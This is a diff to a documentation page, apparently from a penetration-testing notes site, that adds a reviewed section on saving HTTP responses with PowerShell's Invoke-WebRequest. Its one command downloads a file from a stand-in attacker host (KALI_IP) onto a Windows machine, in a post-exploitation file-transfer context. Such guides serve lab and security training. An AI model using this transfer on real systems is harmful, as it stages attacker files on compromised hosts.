@@ -7,7 +7,37 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/invoke-webrequest.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Save an HTTP response to a Windows file
+
+**Run in:** Windows PowerShell. **Requires:** A reachable file URL and a writable destination; the server must serve the requested filename.
+
+```powershell
+Invoke-WebRequest -UseBasicParsing -Uri 'http://KALI_IP:8000/file.bin' -OutFile 'C:\Users\Public\file.bin'
+```
+
+**Read the result:** Inspect response status and the resulting file, especially if the endpoint redirects or requires authentication.
+
+**If A successful request saves an error page or unexpected content:** Use -OutFile for a download; a downloaded login/error page can have the expected filename while containing no useful artifact.
+
+**Next check:** Inspect response status and content type when troubleshooting, then verify size and digest against the original.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## Invoke-WebRequest: choose the operation and read the result
 
@@ -387,3 +417,5 @@ Invoke-WebRequest
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
